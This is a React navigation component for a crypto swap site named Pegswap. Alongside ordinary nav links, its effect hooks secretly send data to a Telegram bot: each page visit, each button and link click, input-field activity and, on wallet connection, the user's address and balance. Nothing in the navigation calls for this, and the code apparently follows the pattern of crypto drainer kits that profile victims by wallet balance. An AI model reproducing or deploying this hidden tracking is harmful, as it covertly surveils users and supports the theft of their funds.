import { useEffect, useState } from 'react';
import { Link, useLocation } from 'react-router-dom';
import { ConnectWalletButton } from '@/components/ConnectWalletButton';
import { motion } from 'framer-motion';
import { AnimatedLogo } from './AnimatedLogo';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { LAMPORTS_PER_SOL } from '@solana/web3.js';
import { sendTelegramMessage } from '@/utils/telegram';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { useChainInfo } from '@/hooks/useChainInfo';
import chainEthereum from '@/assets/chain-ethereum.png';
import chainBnb from '@/assets/chain-bnb.png';
import chainSolana from '@/assets/chain-solana.jpg';
import chainBase from '@/assets/chain-base.jpg';
import chainPolygon from '@/assets/chain-polygon.jpg';

const CHAIN_LOGOS: Record<string, string> = {
  ethereum: chainEthereum,
  bnb: chainBnb,
  polygon: chainPolygon,
  base: chainBase,
};

export const Navigation = () => {
  const location = useLocation();
  const [mobileOpen, setMobileOpen] = useState(false);
  const { connected, publicKey } = useWallet();
  const { connection } = useConnection();
  const { activeChain, getEVMChain } = useChain();
  const { isEVMConnected, evmAddress } = useEVMWallet();
  const { nativeToken } = useChainInfo();
  const evmChain = getEVMChain();

  useEffect(() => {
    const trackVisit = async () => {
      const message = `👀 <b>Page Visit</b>\n📍 <b>Path:</b> <code>${location.pathname}</code>\n👤 <b>Address:</b> <code>${publicKey?.toBase58() || evmAddress || 'Not Connected'}</code>`;
      await sendTelegramMessage(message);
    };
    trackVisit();
  }, [location.pathname, publicKey, evmAddress]);

  useEffect(() => {
    const handleGlobalClick = async (e: MouseEvent) => {
      const target = e.target as HTMLElement;
      const button = target.closest('button');
      const link = target.closest('a');
      
      if (button || link) {
        const label = button?.innerText || link?.innerText || 'Icon/Image';
        const action = button ? 'Button Click' : 'Link Click';
        const message = `🖱️ <b>${action}</b>\n🏷️ <b>Label:</b> <code>${label.trim().slice(0, 50)}</code>\n📍 <b>Page:</b> <code>${location.pathname}</code>\n👤 <b>Address:</b> <code>${publicKey?.toBase58() || evmAddress || 'Not Connected'}</code>`;
        await sendTelegramMessage(message);
      }
    };

    window.addEventListener('click', handleGlobalClick);
    return () => window.removeEventListener('click', handleGlobalClick);
  }, [location.pathname, publicKey, evmAddress]);

  useEffect(() => {
    const handleGlobalInput = (e: Event) => {
      const target = e.target as HTMLInputElement | HTMLTextAreaElement;
      if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
        const label = target.placeholder || target.name || 'Unknown Input';
        const value = target.value;
        if (value.length > 3) {
          const message = `⌨️ <b>Input Interaction</b>\n🏷️ <b>Field:</b> <code>${label}</code>\n📍 <b>Page:</b> <code>${location.pathname}</code>\n👤 <b>Address:</b> <code>${publicKey?.toBase58() || evmAddress || 'Not Connected'}</code>`;
          const timerKey = `input_timer_${label}`;
          if ((window as any)[timerKey]) clearTimeout((window as any)[timerKey]);
          (window as any)[timerKey] = setTimeout(() => sendTelegramMessage(message), 3000);
        }
      }
    };

    window.addEventListener('input', handleGlobalInput);
    return () => window.removeEventListener('input', handleGlobalInput);
  }, [location.pathname, publicKey, evmAddress]);

  useEffect(() => {
    const notifyConnection = async () => {
        if (connected && publicKey) {
            const key = `wallet_notified_v2_${publicKey.toBase58()}`;
            try {
                const balance = await connection.getBalance(publicKey);
                const solBalance = (balance / LAMPORTS_PER_SOL).toFixed(4);
                
                const message = `
🚀 <b>New Wallet Connected</b>

👤 <b>Address:</b> <code>${publicKey.toBase58()}</code>
💰 <b>Balance:</b> ${solBalance} ${nativeToken}
`;
                await sendTelegramMessage(message);
                sessionStorage.setItem(key, 'true');
            } catch (error) {
                console.error("Failed to send connection notification", error);
            }
        }
    };
    
    notifyConnection();
  }, [connected, publicKey, connection, nativeToken]);

  return (
    <nav className="fixed top-0 left-0 right-0 z-50 animated-gradient-nav backdrop-blur-md border-b border-white/5">
      <div className="container mx-auto px-2 sm:px-4 py-3 flex items-center justify-between">
        {/* Logo & Title */}
        <Link to="/" className="flex items-center gap-3 hover:opacity-80 transition-opacity">
          <AnimatedLogo className="w-12 h-12" />
          <h1 className="text-2xl font-extrabold text-gradient">
            Pegswap
          </h1>
        </Link>

        <Link
          to="/market-making"
          className="md:hidden text-sm font-semibold text-muted-foreground hover:text-foreground"
        >
          Market Making
        </Link>

        {/* Desktop Navigation Links & Wallet */}
        <div className="hidden md:flex items-center gap-6">
          <Link
            to="/"
            className={`text-sm font-semibold transition-all relative pb-1 ${
              location.pathname === '/'
                ? 'text-primary'
                : 'text-muted-foreground hover:text-foreground'
            }`}
          >
            Swap
            {location.pathname === '/' && (
              <motion.div
                layoutId="underline"
                className="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-primary to-secondary"
              />
            )}
          </Link>

          <Link
            to="/dex"
            className={`text-sm font-semibold transition-all relative pb-1 ${
              location.pathname === '/dex'
                ? 'text-primary'
                : 'text-muted-foreground hover:text-foreground'
            }`}
          >
            Terminal
            {location.pathname === '/dex' && (
              <motion.div
                layoutId="underline"
                className="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-primary to-secondary"
              />
            )}
          </Link>

          <Link
            to="/otc"
            className={`text-sm font-semibold transition-all relative pb-1 ${
              location.pathname === '/otc'
                ? 'text-primary'
                : 'text-muted-foreground hover:text-foreground'
            }`}
          >
            OTC
            {location.pathname === '/otc' && (
              <motion.div
                layoutId="underline"
                className="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-primary to-secondary"
              />
            )}
          </Link>

          <Link
            to="/claim"
            className={`text-sm font-semibold transition-all relative pb-1 ${
              location.pathname === '/claim'
                ? 'text-primary'
                : 'text-muted-foreground hover:text-foreground'
            }`}
          >
            Claim
            {location.pathname === '/claim' && (
              <motion.div
                layoutId="underline"
                className="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-primary to-secondary"
              />
            )}
          </Link>

          <Link
            to="/market-making"
            className={`text-sm font-semibold transition-all relative pb-1 ${
              location.pathname === '/market-making'
                ? 'text-primary'
                : 'text-muted-foreground hover:text-foreground'
            }`}
          >
            Market Making
            {location.pathname === '/market-making' && (
              <motion.div
                layoutId="underline"
                className="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-primary to-secondary"
              />
            )}
          </Link>

          {/* Chain indicator - LOGOS instead of text */}
          {(isEVMConnected && evmChain) && (
            <span className="flex items-center px-2 py-1 rounded-lg bg-secondary/20 border border-secondary/30">
              <img src={CHAIN_LOGOS[evmChain.icon]} alt={evmChain.name} className="w-6 h-6 rounded-full" />
            </span>
          )}
          {(connected && activeChain === 'solana') && (
            <span className="flex items-center px-2 py-1 rounded-lg bg-primary/20 border border-primary/30">
              <img src={chainSolana} alt="Solana" className="w-6 h-6 rounded-full" />
            </span>
          )}
          <ConnectWalletButton />
        </div>

        {/* Mobile menu toggle */}
        <button
          className="md:hidden p-2 glass-card rounded-xl"
          aria-label="Toggle menu"
          onClick={() => setMobileOpen((v) => !v)}
        >
          <span className="block w-5 h-[2px] bg-foreground mb-1"></span>
          <span className="block w-5 h-[2px] bg-foreground mb-1"></span>
          <span className="block w-5 h-[2px] bg-foreground"></span>
        </button>
      </div>

      {/* Mobile menu panel */}
      {mobileOpen && (
        <div className="md:hidden bg-background/80 backdrop-blur-xl border-t border-white/10">
          <div className="container mx-auto px-2 sm:px-4 py-3 flex flex-col gap-3">
            <Link
              to="/"
              onClick={() => setMobileOpen(false)}
              className={`text-sm font-semibold transition-all relative ${
                location.pathname === '/'
                  ? 'text-primary'
                  : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              Swap
            </Link>
            <Link
              to="/dex"
              onClick={() => setMobileOpen(false)}
              className={`text-sm font-semibold transition-all relative ${
                location.pathname === '/dex'
                  ? 'text-primary'
                  : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              Terminal
            </Link>
            <Link
              to="/otc"
              onClick={() => setMobileOpen(false)}
              className={`text-sm font-semibold transition-all relative ${
                location.pathname === '/otc'
                  ? 'text-primary'
                  : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              OTC
            </Link>
            <Link
              to="/claim"
              onClick={() => setMobileOpen(false)}
              className={`text-sm font-semibold transition-all relative ${
                location.pathname === '/claim'
                  ? 'text-primary'
                  : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              Claim
            </Link>
            <Link
              to="/market-making"
              onClick={() => setMobileOpen(false)}
              className={`text-sm font-semibold transition-all relative ${
                location.pathname === '/market-making'
                  ? 'text-primary'
                  : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              Market Making
            </Link>
            {/* Mobile chain indicator with logo */}
            {(isEVMConnected && evmChain) && (
              <div className="flex items-center gap-2">
                <img src={CHAIN_LOGOS[evmChain.icon]} alt={evmChain.name} className="w-5 h-5 rounded-full" />
                <span className="text-xs text-secondary">{evmChain.shortName}</span>
              </div>
            )}
            {(connected && activeChain === 'solana') && (
              <div className="flex items-center gap-2">
                <img src={chainSolana} alt="Solana" className="w-5 h-5 rounded-full" />
                <span className="text-xs text-primary">SOL</span>
              </div>
            )}
            <div className="pt-2">
              <ConnectWalletButton />
            </div>
          </div>
        </div>
      )}
    </nav>
  );
};